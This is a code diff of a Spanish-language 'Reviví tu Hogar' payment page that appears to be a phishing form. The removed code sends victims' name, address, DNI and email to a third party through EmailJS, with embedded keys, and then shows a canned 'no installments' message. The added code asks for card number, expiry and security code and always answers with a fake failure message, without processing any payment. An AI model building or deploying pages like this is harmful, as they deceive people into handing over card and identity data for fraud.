@@ -2,153 +2,137 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Reviví tu Hogar - Pagos</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Reviví tu Hogar - Pago seguro y simple</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f2f2f2;
+      background: linear-gradient(135deg, #0052D4, #4364F7, #6FB1FC);
+      min-height: 100vh;
       margin: 0;
-      padding: 0;
+      padding: 20px;
       display: flex;
       justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+      align-items: flex-start;
+      color: #fff;
     }
-    .form-container {
-      background: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    .container {
+      background: rgba(255,255,255,0.1);
+      border-radius: 12px;
+      max-width: 420px;
       width: 100%;
-      max-width: 500px;
+      padding: 25px 30px 40px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.2);
     }
-    h2 {
+    h1 {
+      margin: 0 0 8px 0;
+      font-weight: 700;
+      font-size: 1.5rem;
       text-align: center;
-      color: #333;
-      margin-bottom: 10px;
+      letter-spacing: 1px;
     }
-    .info {
-      font-size: 14px;
-      color: #777;
+    p.subtitle {
       text-align: center;
-      margin-bottom: 20px;
+      font-size: 1rem;
+      margin-bottom: 25px;
+      color: #e0e7ffcc;
     }
-    input, select, button {
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="number"],
+    select {
       width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 15px;
+      padding: 10px 14px;
+      margin-bottom: 18px;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      outline: none;
+      transition: box-shadow 0.3s ease;
+    }
+    .card-type {
+      margin-bottom: 18px;
+    }
+    .card-type label {
+      display: inline-block;
+      margin-right: 15px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .card-type input[type="radio"] {
+      margin-right: 6px;
     }
     button {
-      background: #4CAF50;
+      width: 100%;
+      background-color: #0041c4;
       color: white;
+      font-size: 1.1rem;
+      padding: 12px 0;
       border: none;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      font-weight: 700;
+      transition: background-color 0.25s ease;
     }
-    button:hover {
-      background: #45a049;
+    button:hover:not(:disabled) {
+      background-color: #002a85;
     }
-    #mensajeExito {
-      display: none;
-      color: green;
-      font-weight: bold;
-      margin-top: 15px;
+    button:disabled {
+      background-color: #666;
+      cursor: not-allowed;
+    }
+    .message {
       text-align: center;
-    }
-    #cuotasSection {
-      display: none;
-    }
-    #realizarPagoBtn {
-      display: none;
-    }
-    #btnError {
-      background: #c0392b;
-      margin-top: 10px;
+      font-weight: 600;
+      margin-top: 14px;
+      font-size: 1rem;
+      min-height: 24px;
     }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <h2>Reviví tu Hogar</h2>
-    <div class="info">Completá los datos para gestionar tu pago. Al finalizar, recibirás un comprobante por correo.</div>
-    <form id="formulario">
-      <input type="text" name="nombre" placeholder="Nombre completo" required />
-      <input type="email" name="email" placeholder="Correo electrónico" required />
-      <input type="text" name="direccion" placeholder="Dirección completa" required />
-      <input type="text" name="dni" placeholder="DNI" required />
-      <input type="number" name="monto" placeholder="Monto a pagar" required />
+  <div class="container">
+    <h1>Reviví tu Hogar - Pago seguro y simple</h1>
+    <p class="subtitle">Ingresá los datos de tu tarjeta</p>
+    
+    <form id="formularioPago">
+      <label for="nombre">Nombre completo</label>
+      <input type="text" id="nombre" name="nombre" required />
 
-      <button type="button" id="verCuotasBtn">Ver opciones de cuotas</button>
+      <label for="numero">Número de tarjeta</label>
+      <input type="text" id="numero" name="numero" required />
 
-      <div id="cuotasSection">
-        <label for="cuotas">Elegí la cantidad de cuotas:</label>
-        <select name="cuotas" id="cuotas">
-          <option value="3">3 cuotas</option>
-          <option value="6">6 cuotas</option>
-        </select>
+      <label for="vencimiento">Fecha de vencimiento</label>
+      <input type="text" id="vencimiento" name="vencimiento" placeholder="MM/AA" required />
 
-        <button type="submit" id="realizarPagoBtn">Realizar pago</button>
-      </div>
+      <label for="codigo">Código de seguridad</label>
+      <input type="text" id="codigo" name="codigo" required />
+
+      <label for="email">Correo electrónico</label>
+      <input type="email" id="email" name="email" required />
+
+      <button type="submit">Ver opciones de cuotas</button>
+      <div class="message" id="mensajePago">Vuelve a reintentar en unos minutos o verifica los datos de tu tarjeta</div>
     </form>
-
-    <button id="btnError">Realizar pago</button>
-
-    <div id="mensajeExito">Tu tarjeta no nos da opciones de cuotas por el momento</div>
   </div>
 
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    emailjs.init('FL6vofHg7F9vLawQs'); // tu PUBLIC KEY de EmailJS
+    const form = document.getElementById("formularioPago");
+    const mensaje = document.getElementById("mensajePago");
 
-    const verCuotasBtn = document.getElementById("verCuotasBtn");
-    const cuotasSection = document.getElementById("cuotasSection");
-    const realizarPagoBtn = document.getElementById("realizarPagoBtn");
-    const formulario = document.getElementById("formulario");
-    const mensajeExito = document.getElementById("mensajeExito");
-    const btnError = document.getElementById("btnError");
-
-    verCuotasBtn.addEventListener("click", () => {
-      cuotasSection.style.display = "block";
-      verCuotasBtn.style.display = "none";
-      realizarPagoBtn.style.display = "block";
-    });
-
-    formulario.addEventListener("submit", function (event) {
-      event.preventDefault();
-
-      const formData = new FormData(formulario);
-      const templateParams = {
-        nombre: formData.get("nombre"),
-        email: formData.get("email"),
-        direccion: formData.get("direccion"),
-        dni: formData.get("dni"),
-        monto: formData.get("monto"),
-        cuotas: formData.get("cuotas")
-      };
-
-      emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
-        .then(function(response) {
-          mensajeExito.style.display = "block";
-          formulario.reset();
-          cuotasSection.style.display = "none";
-          verCuotasBtn.style.display = "block";
-          realizarPagoBtn.style.display = "none";
-        }, function(error) {
-          alert("Error al enviar. Por favor reintente en unos minutos.");
-        });
-    });
-
-    btnError.addEventListener("click", () => {
-      btnError.innerText = "Cargando... Reintente en unos minutos";
-      btnError.disabled = true;
-      setTimeout(() => {
-        btnError.innerText = "Realizar pago";
-        btnError.disabled = false;
-      }, 3000);
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      mensaje.style.color = "#ffdede";
+      mensaje.textContent = "Vuelve a reintentar en unos minutos o verifica los datos de tu tarjeta";
     });
   </script>
 </body>
